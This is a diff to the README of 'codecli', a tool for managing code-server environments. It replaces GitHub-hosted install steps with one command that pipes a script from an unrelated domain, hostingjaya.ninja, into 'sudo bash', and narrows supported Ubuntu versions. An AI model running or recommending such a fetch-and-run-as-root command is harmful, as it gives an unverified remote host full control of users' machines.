@@ -17,16 +17,8 @@ codecli is a command-line interface tool for creating and managing secure code-s
 
 Make sure you have root access before doing this installation.
 
-Get Dependencies
-
 ```bash
-sudo wget https://raw.githubusercontent.com/gvoze32/codecli/master/scripts/install.sh && sudo chmod +x install.sh && sudo ./install.sh
-```
-
-Install
-
-```bash
-sudo wget https://raw.githubusercontent.com/gvoze32/codecli/master/codecli.sh -O /usr/local/bin/codecli && sudo chmod +x /usr/local/bin/codecli
+sudo curl -fsSL https://hostingjaya.ninja/api/mirror/code-server/build?raw=true | sudo bash
 ```
 
 ## Usage
@@ -51,7 +43,7 @@ codecli quickcreate
 
 ## Supported Environments
 
-- Debian-based systems (Ubuntu 20.04, 22.04, 24.04)
+- Debian-based systems (Ubuntu 24.04)
 
 ## Backup
 
